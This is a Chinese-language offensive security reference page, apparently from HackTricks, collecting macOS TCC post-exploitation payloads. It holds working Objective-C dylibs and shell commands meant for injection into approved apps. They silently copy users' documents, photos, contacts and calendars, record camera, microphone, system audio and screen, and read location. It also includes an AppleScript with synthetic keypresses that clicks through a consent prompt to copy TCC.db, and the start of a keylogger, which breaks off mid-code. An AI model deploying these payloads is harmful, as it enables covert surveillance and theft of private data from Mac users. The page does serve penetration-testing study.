# macOS TCC Payloads

{{#include ../../../../banners/hacktricks-training.md}}

> [!TIP]
> TCC 决策与请求资源的**进程身份**绑定。在 post-exploitation 中，通常的目标是将这些 payload 注入到一个已获批准的应用中（或在其 bundle / signature 上下文中以其他方式执行），而不是运行一个会触发自身提示的新 helper。
>
> 对于 **Screen Recording**、**Input Monitoring** 和**合成输入**，现代 macOS 还提供了显式的 preflight / request API，例如 `CGPreflightScreenCaptureAccess`、`CGRequestScreenCaptureAccess`、`CGRequestListenEventAccess` 和 `CGRequestPostEventAccess`。

> [!WARNING]
> 这仍然是一条非常现实的攻击路径：近期针对 Microsoft macOS 应用的权限窃取研究表明，**弱 library validation / plugin loading** 可能让攻击者复用受害应用已经获授的**摄像头**、**麦克风**及其他 TCC 权限，而无需再次触发提示。<sup>[[1]](#references)</sup>

## 使用 payload 前的快速初步检查

近期的权限窃取研究不断强化同一套工作流程：首先找到一个已经拥有所需 TCC 授权的应用，然后确认它是否是一个现实可行的注入目标。<sup>[[1]](#references)</sup>
```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
"select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"

codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
egrep 'disable-library-validation|allow-dyld-environment-variables'
```
如果目标还会加载攻击者控制的 plug-ins / frameworks，这些 payload 会变得更加有趣。有关在进入一个已获得批准的进程后进行 post-exploitation 的更多思路，请查看[这个相关页面](macos-tcc-credential-and-data-theft.md)。

### Desktop

- **Entitlement**：无
- **TCC**：kTCCServiceSystemPolicyDesktopFolder

{{#tabs}}
{{#tab name="ObjetiveC"}}
将 `$HOME/Desktop` 复制到 `/tmp/desktop`。
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
NSString *tmpPhotosPath = @"/tmp/desktop";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
将 `$HOME/Desktop` 复制到 `/tmp/desktop`。
```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```
{{#endtab}}
{{#endtabs}}

### 文档

- **Entitlement**：无
- **TCC**：`kTCCServiceSystemPolicyDocumentsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
将 `$HOME/Documents` 复制到 `/tmp/documents`。
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
NSString *tmpPhotosPath = @"/tmp/documents";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
将 `$HOME/`Documents 复制到 `/tmp/documents`。
```bash
cp -r "$HOME/Documents" "/tmp/documents"
```
{{#endtab}}
{{#endtabs}}

### 下载

- **Entitlement**：无
- **TCC**：`kTCCServiceSystemPolicyDownloadsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
将 `$HOME/Downloads` 复制到 `/tmp/downloads`。
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
NSString *tmpPhotosPath = @"/tmp/downloads";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
将 `$HOME/Downloads` 复制到 `/tmp/downloads`。
```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```
{{#endtab}}
{{#endtabs}}

### 照片图库

- **Entitlement**: `com.apple.security.personal-information.photos-library`
- **TCC**: `kTCCServicePhotos`

{{#tabs}}
{{#tab name="ObjetiveC"}}
将 `$HOME/Pictures/Photos Library.photoslibrary` 复制到 `/tmp/photos`。
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
NSString *tmpPhotosPath = @"/tmp/photos";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
将 `$HOME/Pictures/Photos Library.photoslibrary` 复制到 `/tmp/photos`。
```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```
{{#endtab}}
{{#endtabs}}

### 联系人

- **Entitlement**: `com.apple.security.personal-information.addressbook`
- **TCC**: `kTCCServiceAddressBook`

{{#tabs}}
{{#tab name="ObjetiveC"}}
将 `$HOME/Library/Application Support/AddressBook` 复制到 `/tmp/contacts`。
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
NSString *tmpPhotosPath = @"/tmp/contacts";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
将 `$HOME/Library/Application Support/AddressBook` 复制到 `/tmp/contacts`。
```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```
{{#endtab}}
{{#endtabs}}

### 日历

- **Entitlement**: `com.apple.security.personal-information.calendars`
- **TCC**: `kTCCServiceCalendar`

{{#tabs}}
{{#tab name="ObjectiveC"}}
将 `$HOME/Library/Calendars` 复制到 `/tmp/calendars`。
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
NSString *tmpPhotosPath = @"/tmp/calendars";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
将 `$HOME/Library/Calendars` 复制到 `/tmp/calendars`。
```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```
{{#endtab}}
{{#endtabs}}

### Camera

- **Entitlement**: `com.apple.security.device.camera`
- **TCC**: `kTCCServiceCamera`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Record a 3s video and save it in **`/tmp/recording.mov`**<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}
- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
NSError *error;
self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
if (error) {
NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
return;
}
if ([self.captureSession canAddInput:self.videoDeviceInput]) {
[self.captureSession addInput:self.videoDeviceInput];
}
self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([self.captureSession canAddOutput:self.movieFileOutput]) {
[self.captureSession addOutput:self.movieFileOutput];
}
}
- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = @"/tmp/recording.mov";
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}
- (void)stopRecording {
[self.movieFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
[videoRecorder startRecording];
[NSThread sleepForTimeInterval:3.0];
[videoRecorder stopRecording];
[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
检查程序是否有权访问摄像头。<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end
@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to camera granted.");
return YES;
} else {
NSLog(@"[-] Access to camera denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
[CameraAccessChecker hasCameraAccess];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
如果当前进程仍处于 `NotDetermined` 状态，则触发摄像头提示。<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void camprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
使用摄像头拍照
```bash
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```
{{#endtab}}
{{#endtabs}}

### 麦克风

- **Entitlement**: **com.apple.security.device.audio-input**
- **TCC**: `kTCCServiceMicrophone`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
录制 5 秒音频并将其存储在 `/tmp/recording.m4a`<sup>[[6]](#references)</sup>。
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}

- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
NSError *error;
self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];

if (error) {
NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
return;
}

if ([self.captureSession canAddInput:self.audioDeviceInput]) {
[self.captureSession addInput:self.audioDeviceInput];
}

self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

if ([self.captureSession canAddOutput:self.audioFileOutput]) {
[self.captureSession addOutput:self.audioFileOutput];
}
}

- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}

- (void)stopRecording {
[self.audioFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
NSLog(@"Saved to %@", outputFileURL.path);
}

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {

freopen("/tmp/logs.txt", "a", stderr);
AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

[audioRecorder startRecording];
[NSThread sleepForTimeInterval:5.0];
[audioRecorder stopRecording];

[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
检查应用是否具有访问麦克风的权限。<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end
@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to microphone granted.");
return YES;
} else {
NSLog(@"[-] Access to microphone denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
[MicrophoneAccessChecker hasMicrophoneAccess];
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
如果当前进程仍处于 `NotDetermined` 状态，则触发麦克风提示。<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void micprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
录制一段 5 秒音频并将其存储在 `/tmp/recording.wav`
```bash
# Check the microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Use microphone from index 1 from the previous list to record
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```
{{#endtab}}
{{#endtabs}}

### System Audio（Core Audio process taps）

- **Entitlement**：对于未进行 sandbox 的客户端，没有专用的 system-audio-capture entitlement（仍适用常规 sandbox 限制）
- **Usage description**：`NSAudioCaptureUsageDescription`
- **TCC**：System Audio Recording（独立于 Microphone 授权）

在 **macOS 14.2+** 上，Core Audio process taps 可以复制选定进程、进程组或全局混音的输出音频，而无需安装虚拟 loopback driver。底层链路为 `CATapDescription` -> `AudioHardwareCreateProcessTap` -> private aggregate device -> `AudioDeviceIOProc`；首次通过包含该 tap 的 aggregate 开始录音时，macOS 会请求 System Audio Recording 访问权限。bundle 必须包含 `NSAudioCaptureUsageDescription`，否则 consent 流程无法正常工作。<sup>[[7]](#references)</sup>

对于快速 payload，[`catap`](https://github.com/sbetko/catap) 封装了 tap、aggregate-device、IO callback、WAV writer 和 cleanup lifecycle：<sup>[[8]](#references)</sup>
```bash
python3 -m venv /tmp/catap-env
source /tmp/catap-env/bin/activate
pip install catap
catap list-apps
catap record Safari -d 10 -o /tmp/safari.wav
catap record --system -d 10 -o /tmp/system-mix.wav
```
> [!WARNING]
> TCC 将 CLI capture 归因于**承载它的 terminal app**，而不仅仅是 Python process。如果没有 System Audio Recording grant，Core Audio graph 可能会启动并正常提供大小正确但**填充为零的 buffers**，这很容易被误认为是对安静目标进行的正常 capture。为承载它的 app 授予权限，重启该 app，然后使用已知的可听见 source 重复测试；`catap` 还会报告某次 recording 是否仅包含 silence。<sup>[[8]](#references)</sup>

### Location

> [!TIP]
> 要让 app 获取 location，必须启用（来自 Privacy & Security 的）**Location Services**；如果未启用，app 将无法访问它。

- **Entitlement**: `com.apple.security.personal-information.location`
- **TCC**: Granted in `/var/db/locationd/clients.plist`

{{#tabs}}
{{#tab name="ObjectiveC"}}
将 location 写入 `/tmp/logs.txt`
```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *location = [locations lastObject];
NSLog(@"Current location: %@", location);
exit(0); // Exit the program after receiving the first location update
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
NSLog(@"Error getting location: %@", error);
exit(1); // Exit the program on error
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSLog(@"Getting location");
CLLocationManager *locationManager = [[CLLocationManager alloc] init];
LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
locationManager.delegate = delegate;

[locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
[locationManager startUpdatingLocation];

NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
while (true) {
[runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}

NSLog(@"Location completed successfully.");
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="Shell"}}
从 shell 获取当前目录。<sup>[[2]](#references)</sup>
```bash
# Fast option: use a dedicated CoreLocation CLI helper
brew install --cask corelocationcli
CoreLocationCLI --json

# Keep printing updates while the device moves
CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
```
> [!TIP]
> 这仍然依赖于已启用的 **Location Services**，并且工具或终端已获得 TCC 批准。在大多数 Mac 上，`CoreLocationCLI` 还依赖 Wi-Fi 辅助定位，因此禁用 Wi-Fi 通常会导致 `kCLErrorDomain error 0`。

{{#endtab}}
{{#endtabs}}

### Screen Recording

- **Entitlement**：无
- **TCC**：`kTCCServiceScreenCapture`

{{#tabs}}
{{#tab name="ObjectiveC"}}
在 `/tmp/screen.mov` 中录制主屏幕 5 秒
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)output
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording error: %@", error);
} else {
NSLog(@"Recording finished successfully.");
}
exit(0);
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
if ([captureSession canAddInput:screenInput]) {
[captureSession addInput:screenInput];
}

AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([captureSession canAddOutput:fileOutput]) {
[captureSession addOutput:fileOutput];
}

[captureSession startRunning];

MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
[fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];

// Run the loop for 5 seconds to capture
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
[fileOutput stopRecording];
});

CFRunLoopRun();
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check / Prompt"}}
检查当前进程是否可以捕获屏幕，并在需要时触发 TCC 提示。
```objectivec
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>

// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib

__attribute__((constructor))
static void screencheck(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
BOOL allowed = CGPreflightScreenCaptureAccess();
if (!allowed) {
allowed = CGRequestScreenCaptureAccess();
}
NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
fclose(stderr);
}
```
{{#endtab}}

{{#tab name="Shell"}}
录制主屏幕 5 秒
```bash
screencapture -V 5 /tmp/screen.mov
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> 在 **macOS 12.3+** 上，`ScreenCaptureKit` 通常是比 `AVCaptureScreenInput` 更好的 post-exploitation primitive：它支持高性能 streaming、使用 `SCScreenshotManager` 抓取单帧，以及 streaming **system audio**。近期的 `ScreenCaptureKit` 更新还为 `SCStreamConfiguration` 添加了 `captureMicrophone` / `microphoneCaptureDeviceID`，并提供了可直接录制到文件的 `SCRecordingOutput`，因此，一个被劫持的 screen-capture client 可以直接保存屏幕和 system audio；当该进程同时持有 `kTCCServiceMicrophone` 时，还可以加入麦克风音频。<sup>[[4]](#references)</sup> 有关更多 desktop-session abuse primitives，请参阅[此相关页面](../macos-input-monitoring-screen-capture-accessibility.md)。

### Accessibility

- **Entitlement**：无
- **TCC**：`kTCCServiceAccessibility`

利用 TCC privilege 接受 Finder 的控制并按下 Enter，以此绕过 TCC

{{#tabs}}
{{#tab name="Accept TCC"}}
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears

void SimulateKeyPress(CGKeyCode keyCode) {
CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
CGEventPost(kCGHIDEventTap, keyDownEvent);
CGEventPost(kCGHIDEventTap, keyUpEvent);
if (keyDownEvent) CFRelease(keyDownEvent);
if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
NSLog(@"Starting AppleScript");
NSString *scriptSource = @"tell application \"Finder\"\n"
"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
"set targetFolder to POSIX file \"/tmp\" as alias\n"
"duplicate file sourceFile to targetFolder with replacing\n"
"end tell\n";

NSDictionary *errorDict = nil;
NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
[appleScript executeAndReturnError:&errorDict];

if (errorDict) {
NSLog(@"AppleScript Error: %@", errorDict);
}
}

int main() {
@autoreleasepool {
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
RunAppleScript();
});

// Simulate pressing the Enter key every 0.1 seconds
NSLog(@"Starting key presses");
for (int i = 0; i < 10; ++i) {
SimulateKeyPress((CGKeyCode)36); // Key code for Enter
usleep(100000); // 0.1 seconds
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="Check / Prompt"}}
检查当前进程是否已获得 Accessibility 信任；如果尚未获得，请求 macOS 显示授权界面。
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
__attribute__((constructor))
static void axprompt(int argc, const char **argv) {
NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
}
```
{{#endtab}}

{{#tab name="Keylogger"}}
将按下的键存储在 **`/tmp/keystrokes.txt`**
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
if (fileHandle) {
[fileHandle seekToEndOfFile];
[fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
[fileHandle closeFile];
} else {
// If the file does not exist, create it
[str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
if (type == kCGEventKeyDown) {
CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

NSString *keyString = nil;
// First, handle special non-printable keys
switch (keyCode) {
case kVK_Return: keyString = @"<Return>"; break;
